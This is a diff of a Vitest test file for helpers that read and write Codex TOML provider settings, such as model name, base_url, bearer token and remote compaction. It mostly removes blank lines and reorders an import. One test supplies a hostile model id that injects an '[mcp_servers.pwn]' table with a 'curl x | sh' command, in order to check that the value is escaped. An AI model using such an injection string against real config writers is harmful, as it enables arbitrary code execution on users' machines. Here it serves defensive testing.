@@ -1,16 +1,15 @@
 import { describe, expect, it } from "vitest";
 import {
   codexApiFormatFromWireApi,
-  isCodexAnthropicWireApi,
   extractCodexBaseUrl,
   extractCodexExperimentalBearerToken,
   extractCodexModelName,
+  isCodexAnthropicWireApi,
   isCodexRemoteCompactionEnabled,
   setCodexBaseUrl,
   setCodexModelName,
   setCodexRemoteCompaction,
 } from "./providerConfigUtils";
-
 describe("Codex wire API helpers", () => {
   it("recognizes Anthropic Messages aliases", () => {
     expect(isCodexAnthropicWireApi("anthropic")).toBe(true);
@@ -19,7 +18,6 @@ describe("Codex wire API helpers", () => {
     expect(isCodexAnthropicWireApi("claude")).toBe(true);
     expect(isCodexAnthropicWireApi("responses")).toBe(false);
   });
-
   it("maps every backend-supported Anthropic alias to the form format", () => {
     for (const wireApi of [
       "anthropic",
@@ -34,7 +32,6 @@ describe("Codex wire API helpers", () => {
     expect(codexApiFormatFromWireApi("chat_completions")).toBe("openai_chat");
   });
 });
-
 describe("Codex remote compaction config helpers", () => {
   it("enables remote compaction by naming the active custom provider OpenAI", () => {
     const input = `model_provider = "custom"
@@ -49,14 +46,11 @@ wire_api = "responses"
 name = "Backup"
 base_url = "https://backup.example/v1"
 `;
-
     const result = setCodexRemoteCompaction(input, true, "AIHubMix");
-
     expect(isCodexRemoteCompactionEnabled(result)).toBe(true);
     expect(result).toContain(`[model_providers.custom]\nname = "OpenAI"`);
     expect(result).toContain(`[model_providers.backup]\nname = "Backup"`);
   });
-
   it("disables remote compaction by restoring the provider display name", () => {
     const input = `model_provider = "custom"
 
@@ -65,22 +59,17 @@ name = "OpenAI"
 base_url = "https://aihubmix.example/v1"
 wire_api = "responses"
 `;
-
     const result = setCodexRemoteCompaction(input, false, "AIHubMix");
-
     expect(isCodexRemoteCompactionEnabled(result)).toBe(false);
     expect(result).toContain(`name = "AIHubMix"`);
   });
-
   it("does not rewrite reserved built-in providers", () => {
     const input = `model_provider = "openai"
 model = "gpt-5"
 `;
-
     expect(setCodexRemoteCompaction(input, true, "OpenAI")).toBe(input);
     expect(isCodexRemoteCompactionEnabled(input)).toBe(false);
   });
-
   it("treats amazon-bedrock-runtime as reserved, matching the backend list", () => {
     // Codex 0.149 reserves this id; the backend never writes a bearer token
     // into its table, so the frontend must not read one out of it either.
@@ -90,11 +79,9 @@ experimental_bearer_token = "top-level-key"
 [model_providers.amazon-bedrock-runtime]
 experimental_bearer_token = "stale-table-key"
 `;
-
     expect(extractCodexExperimentalBearerToken(input)).toBe("top-level-key");
   });
 });
-
 describe("Codex model name config helpers", () => {
   const input = `# user comment
 model_provider = "custom"
@@ -105,18 +92,15 @@ model_reasoning_effort = "high"
 name = "Example"
 base_url = "https://example.com/v1"
 `;
-
   it("extracts the top-level model", () => {
     expect(extractCodexModelName(input)).toBe("gpt-5.5");
   });
-
   it("ignores model keys inside sections", () => {
     const sectionOnly = `[profiles.fast]
 model = "gpt-5.5-mini"
 `;
     expect(extractCodexModelName(sectionOnly)).toBeUndefined();
   });
-
   it("updates the model in place preserving comments", () => {
     const result = setCodexModelName(input, "gpt-5.6");
     expect(extractCodexModelName(result)).toBe("gpt-5.6");
@@ -124,7 +108,6 @@ model = "gpt-5.5-mini"
     expect(result).toContain(`model_reasoning_effort = "high"`);
     expect(result).not.toContain("gpt-5.5");
   });
-
   it("inserts a model line when absent", () => {
     const withoutModel = `model_provider = "custom"
 
@@ -134,18 +117,15 @@ name = "Example"
     const result = setCodexModelName(withoutModel, "gpt-5.6");
     expect(extractCodexModelName(result)).toBe("gpt-5.6");
   });
-
   it("removes the top-level model line when cleared", () => {
     const result = setCodexModelName(input, "");
     expect(extractCodexModelName(result)).toBeUndefined();
     expect(result).toContain(`model_provider = "custom"`);
   });
-
   it("escapes hostile model ids instead of injecting TOML lines", () => {
     // /models 下拉的 id 来自远端响应；换行注入若不转义会成为独立 TOML 行
     const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
     const result = setCodexModelName(input, hostile);
-
     expect(result).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
     expect(result).not.toMatch(/^command = /m);
     expect(result).toContain(
@@ -155,18 +135,15 @@ name = "Example"
       result.split("\n").filter((line) => line.startsWith("model = ")),
     ).toHaveLength(1);
   });
-
   it("escapes backslashes in model names", () => {
     const result = setCodexModelName(input, "vendor\\model");
     expect(result).toContain('model = "vendor\\\\model"');
   });
-
   it("round-trips names containing quotes and backslashes", () => {
     const name = 'a"b\\c';
     const written = setCodexModelName(input, name);
     expect(extractCodexModelName(written)).toBe(name);
   });
-
   it("replaces an escaped existing model line instead of duplicating it", () => {
     const written = setCodexModelName(input, 'evil"name');
     const result = setCodexModelName(written, "gpt-5.6");
@@ -175,7 +152,6 @@ name = "Example"
     ).toHaveLength(1);
     expect(extractCodexModelName(result)).toBe("gpt-5.6");
   });
-
   it("replaces empty-string and single-quoted model lines", () => {
     const emptyModel = `model_provider = "custom"\nmodel = ""\n`;
     expect(extractCodexModelName(emptyModel)).toBe("");
@@ -184,12 +160,10 @@ name = "Example"
       replaced.split("\n").filter((line) => line.startsWith("model = ")),
     ).toHaveLength(1);
     expect(extractCodexModelName(replaced)).toBe("gpt-5.6");
-
     const singleQuoted = `model = 'kimi-k2.7'\n`;
     expect(extractCodexModelName(singleQuoted)).toBe("kimi-k2.7");
   });
 });
-
 describe("setCodexBaseUrl", () => {
   it("writes base_url inside [model_providers.custom] when [[skills.config]] follows", () => {
     // Regression: [[skills.config]] is an array-of-tables header ([[...]])
@@ -208,9 +182,7 @@ requires_openai_auth = true
 path = "/path/to/some-skill/SKILL.md"
 enabled = false
 `;
-
     const result = setCodexBaseUrl(input, "https://relay.example.com/v1");
-
     // base_url must be inside [model_providers.custom], i.e. before the
     // [[skills.config]] header.
     const baseUrlLine = 'base_url = "https://relay.example.com/v1"';
@@ -219,11 +191,9 @@ enabled = false
     expect(baseUrlIndex).toBeGreaterThan(-1);
     expect(skillsHeaderIndex).toBeGreaterThan(-1);
     expect(baseUrlIndex).toBeLessThan(skillsHeaderIndex);
-
     // Round-trip: extractCodexBaseUrl must find it in the custom table.
     expect(extractCodexBaseUrl(result)).toBe("https://relay.example.com/v1");
   });
-
   it("writes base_url inside [model_providers.custom] when [[skills.config]] precedes it", () => {
     const input = `model_provider = "custom"
 model = "gpt-5.5"
@@ -237,26 +207,21 @@ name = "custom"
 wire_api = "responses"
 requires_openai_auth = true
 `;
-
     const result = setCodexBaseUrl(input, "https://relay.example.com/v1");
-
     // base_url must be after [model_providers.custom] and NOT inside the
     // skills.config array that precedes it.
     const baseUrlLine = 'base_url = "https://relay.example.com/v1"';
     const baseUrlIndex = result.indexOf(baseUrlLine);
     const customHeaderIndex = result.indexOf("[model_providers.custom]");
     expect(baseUrlIndex).toBeGreaterThan(customHeaderIndex);
-
     // The skills.config block must not contain base_url.
     const skillsBlock = result.slice(
       result.indexOf("[[skills.config]]"),
       result.indexOf("[model_providers.custom]"),
     );
     expect(skillsBlock).not.toContain("base_url");
-
     expect(extractCodexBaseUrl(result)).toBe("https://relay.example.com/v1");
   });
-
   it("recovers base_url from a corrupted [[skills.config]] entry", () => {
     // v4.0.21 wrote base_url inside [[skills.config]] instead of
     // [model_providers.custom]. When the user edits the URL again,
@@ -274,19 +239,14 @@ path = "/synthetic/example/SKILL.md"
 enabled = false
 base_url = "https://old.example/v1"
 `;
-
     const result = setCodexBaseUrl(input, "https://new.example/v1");
-
     // The new base_url must be in [model_providers.custom].
     expect(extractCodexBaseUrl(result)).toBe("https://new.example/v1");
-
     // The old URL must be gone entirely.
     expect(result).not.toContain("https://old.example/v1");
-
     // The skills.config block must not contain base_url.
     const skillsBlock = result.slice(result.indexOf("[[skills.config]]"));
     expect(skillsBlock).not.toContain("base_url");
-
     // Skill path and enabled flag must be preserved.
     expect(skillsBlock).toContain('path = "/synthetic/example/SKILL.md"');
     expect(skillsBlock).toContain("enabled = false");
